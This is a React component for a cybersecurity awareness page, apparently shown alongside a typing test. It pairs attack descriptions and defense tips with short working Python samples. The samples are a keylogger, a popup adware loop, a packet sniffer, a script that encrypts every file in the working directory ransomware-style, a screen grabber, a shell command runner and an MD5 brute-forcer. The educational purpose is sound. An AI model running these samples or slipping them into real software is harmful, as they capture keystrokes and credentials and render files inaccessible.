"use client"

import { useState } from "react"

const CYBER_ATTACKS = {
  adware: {
    title: "Adware Attack",
    description: "Malicious software that displays unwanted advertisements and can redirect users to malicious websites.",
    attack: "Adware can slow down your system, consume bandwidth, and redirect you to phishing sites or malware downloads.",
    defense: [
      "Use reputable ad blockers and anti-malware software",
      "Keep your operating system and browsers updated",
      "Avoid clicking on suspicious pop-up ads",
      "Be cautious when downloading free software",
      "Regularly scan your system for malware"
    ],
    code: `import webbrowser
import time
import random

urls = [
    "https://example.com/ad1",
    "https://example.com/ad2", 
    "https://example.com/ad3"
]

while True:
    webbrowser.open(random.choice(urls))
    time.sleep(30)`
  },
  
  keylogger: {
    title: "Keylogger Attack",
    description: "Malicious software that secretly records keystrokes to steal passwords, credit card numbers, and other sensitive information.",
    attack: "Keyloggers can capture everything you type, including passwords, personal messages, and financial information.",
    defense: [
      "Use two-factor authentication (2FA) whenever possible",
      "Install reputable antivirus software with real-time protection",
      "Use virtual keyboards for sensitive data entry",
      "Regularly update your operating system and software",
      "Be cautious of suspicious email attachments and downloads"
    ],
    code: `from pynput import keyboard
def on_press(key):
    with open("log.txt", "a") as f:
        try:
            f.write(key.char)
        except:
            f.write(f" [{key.name}] ")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()`
  },
  
  network_sniffer: {
    title: "Network Sniffing Attack",
    description: "Intercepting and analyzing network traffic to steal sensitive data transmitted over unsecured networks.",
    attack: "Attackers can capture unencrypted data including passwords, emails, and personal information from network traffic.",
    defense: [
      "Always use HTTPS/SSL encryption for sensitive websites",
      "Use VPNs on public Wi-Fi networks",
      "Avoid entering sensitive information on public networks",
      "Use encrypted messaging apps for private communications",
      "Regularly check for network intrusions"
    ],
    code: `from scapy.all import *
def packet_handler(packet):
    if packet.haslayer(IP):
        print(f"Source: {packet[IP].src} -> Destination: {packet[IP].dst}")
sniff(prn=packet_handler)`
  },
  
  ransomware: {
    title: "Ransomware Attack",
    description: "Malicious software that encrypts files and demands payment to restore access to the victim's data.",
    attack: "Ransomware can encrypt all your files, making them inaccessible until you pay a ransom (which doesn't guarantee recovery).",
    defense: [
      "Regularly backup your important files to external storage or cloud",
      "Keep your operating system and software updated",
      "Be cautious with email attachments and suspicious links",
      "Use reputable antivirus software with real-time protection",
      "Never pay ransom demands - contact law enforcement instead"
    ],
    code: `import os
from cryptography.fernet import Fernet
key = Fernet.generate_key()
cipher = Fernet(key)
for file in os.listdir("."):
    if os.path.isfile(file) and file != __file__:
        try:
            with open(file, "rb") as f:
                data = f.read()
            encrypted = cipher.encrypt(data)
            with open(file, "wb") as f:
                f.write(encrypted)
        except:
            pass

with open("key.key", "wb") as key_file:
    key_file.write(key)`
  },
  
  screenshot: {
    title: "Screen Capture Attack",
    description: "Malicious software that takes screenshots of your screen to steal sensitive visual information.",
    attack: "Attackers can capture screenshots of your desktop, including passwords, documents, and private conversations.",
    defense: [
      "Use screen privacy filters on sensitive displays",
      "Be cautious of remote access software",
      "Regularly scan for malware and spyware",
      "Use virtual desktops for sensitive work",
      "Keep your system updated with security patches"
    ],
    code: `import pyscreenshot as ImageGrab

image = ImageGrab.grab()
image.save("screenshot.png")`
  },
  
  socket_server: {
    title: "Backdoor/Remote Access Attack",
    description: "Creating unauthorized remote access to a system, allowing attackers to control it from a distance.",
    attack: "Backdoors give attackers full control over your system, allowing them to steal data, install more malware, or use your computer for illegal activities.",
    defense: [
      "Use strong, unique passwords for all accounts",
      "Enable two-factor authentication",
      "Keep your firewall enabled and properly configured",
      "Regularly update your operating system and software",
      "Monitor your network for unusual activity"
    ],
    code: `import socket
import threading

def handle_client(client_socket):
    while True:
        data = client_socket.recv(1024)
        if not data:
            break
        client_socket.send(data)
    client_socket.close()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('localhost', 9999))
server.listen(5)`
  },
  
  command_execution: {
    title: "Command Injection Attack",
    description: "Exploiting vulnerabilities to execute arbitrary system commands, potentially gaining full system control.",
    attack: "Command injection can allow attackers to run any command on your system, potentially stealing data, installing malware, or causing system damage.",
    defense: [
      "Validate and sanitize all user inputs",
      "Use parameterized queries and prepared statements",
      "Implement proper access controls and permissions",
      "Regularly audit your applications for vulnerabilities",
      "Use web application firewalls (WAFs)"
    ],
    code: `import subprocess
import sys

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, 
                              capture_output=True, text=True)
        return result.stdout
    except Exception as e:
        return str(e)

command = input("Enter command: ")
output = execute_command(command)
print(output)`
  },
  
  hash_cracking: {
    title: "Password Cracking Attack",
    description: "Using computational methods to reverse-engineer hashed passwords and gain unauthorized access to accounts.",
    attack: "Weak passwords can be cracked using brute force, dictionary attacks, or rainbow tables, giving attackers access to your accounts.",
    defense: [
      "Use strong, unique passwords (12+ characters with mixed case, numbers, symbols)",
      "Enable two-factor authentication (2FA) on all accounts",
      "Use a password manager to generate and store passwords",
      "Regularly update passwords and never reuse them",
      "Be aware of data breaches and change compromised passwords immediately"
    ],
    code: `import hashlib
import itertools
import string

def crack_hash(target_hash, max_length=4):
    chars = string.ascii_lowercase + string.digits
    for length in range(1, max_length + 1):
        for combo in itertools.product(chars, repeat=length):
            password = ''.join(combo)
            if hashlib.md5(password.encode()).hexdigest() == target_hash:
                return password
    return None`
  }
}

export default function CyberAwareness({ currentSnippet, onClose }) {
  const [selectedAttack, setSelectedAttack] = useState(null)
  
  // Find which attack matches the current snippet
  const findAttackBySnippet = (snippet) => {
    if (!snippet) return null
    const snippetKey = snippet.split('\n')[0].toLowerCase()
    for (const [key, attack] of Object.entries(CYBER_ATTACKS)) {
      if (attack.code === snippet) {
        return key
      }
    }
    return null
  }
  
  const currentAttackKey = findAttackBySnippet(currentSnippet)
  const currentAttack = currentAttackKey ? CYBER_ATTACKS[currentAttackKey] : null
  const isEducationMode = !currentSnippet
  
  return (
    <div className="space-y-6">
      <div className="text-center">
        <h2 className="text-3xl font-bold text-accent mb-2">🛡️ Cybersecurity Awareness</h2>
        <p className="text-muted-foreground text-lg">
          {isEducationMode 
            ? "Comprehensive guide to cyber attacks and defense strategies"
            : "Learn about cyber attacks and how to defend against them"
          }
        </p>
      </div>
      
      {currentAttack && (
        <div className="bg-card border border-border rounded-lg p-6">
          <div className="flex items-center gap-3 mb-4">
            <span className="text-2xl">⚠️</span>
            <h3 className="text-2xl font-bold text-destructive">{currentAttack.title}</h3>
          </div>
          
          <p className="text-muted-foreground mb-4 text-lg">{currentAttack.description}</p>
          
          <div className="grid md:grid-cols-2 gap-6">
            <div className="bg-destructive/10 border border-destructive/20 rounded-lg p-4">
              <h4 className="font-bold text-destructive mb-2">🚨 How This Attack Works:</h4>
              <p className="text-sm">{currentAttack.attack}</p>
            </div>
            
            <div className="bg-green-500/10 border border-green-500/20 rounded-lg p-4">
              <h4 className="font-bold text-green-500 mb-2">🛡️ How to Defend:</h4>
              <ul className="text-sm space-y-1">
                {currentAttack.defense.map((tip, index) => (
                  <li key={index} className="flex items-start gap-2">
                    <span className="text-green-500 mt-1">✓</span>
                    <span>{tip}</span>
                  </li>
                ))}
              </ul>
            </div>
          </div>
        </div>
      )}
      
      <div className="grid md:grid-cols-2 lg:grid-cols-3 gap-4">
        {Object.entries(CYBER_ATTACKS).map(([key, attack]) => (
          <div 
            key={key}
            className={`bg-card border rounded-lg p-4 cursor-pointer transition-all hover:border-accent ${
              selectedAttack === key ? 'border-accent bg-accent/5' : 'border-border'
            }`}
            onClick={() => setSelectedAttack(selectedAttack === key ? null : key)}
          >
            <h4 className="font-bold mb-2">{attack.title}</h4>
            <p className="text-sm text-muted-foreground">{attack.description}</p>
            {selectedAttack === key && (
              <div className="mt-3 space-y-2">
                <div className="text-xs">
                  <strong className="text-destructive">Attack:</strong> {attack.attack}
                </div>
                <div className="text-xs">
                  <strong className="text-green-500">Defense:</strong>
                  <ul className="mt-1 space-y-1">
                    {attack.defense.slice(0, 2).map((tip, index) => (
                      <li key={index}>• {tip}</li>
                    ))}
                  </ul>
                </div>
              </div>
            )}
          </div>
        ))}
      </div>
      
      <div className="bg-accent/10 border border-accent/20 rounded-lg p-6 text-center">
        <h3 className="text-xl font-bold text-accent mb-2">🔒 General Security Tips</h3>
        <div className="grid md:grid-cols-2 gap-4 text-sm">
          <div>
            <h4 className="font-bold mb-2">Essential Practices:</h4>
            <ul className="space-y-1 text-left">
              <li>• Keep all software updated</li>
              <li>• Use strong, unique passwords</li>
              <li>• Enable 2FA everywhere possible</li>
              <li>• Be suspicious of unexpected emails</li>
            </ul>
          </div>
          <div>
            <h4 className="font-bold mb-2">Red Flags to Watch:</h4>
            <ul className="space-y-1 text-left">
              <li>• Unexpected pop-ups or ads</li>
              <li>• Slow computer performance</li>
              <li>• Unusual network activity</li>
              <li>• Files you didn't create</li>
            </ul>
          </div>
        </div>
      </div>
      
      {onClose && (
        <div className="text-center">
          <button
            onClick={onClose}
            className="px-6 py-3 bg-accent text-accent-foreground rounded-lg font-semibold hover:opacity-90 transition-opacity"
          >
            {isEducationMode ? "Back to Main Menu" : "Continue to Typing Test"}
          </button>
        </div>
      )}
    </div>
  )
}
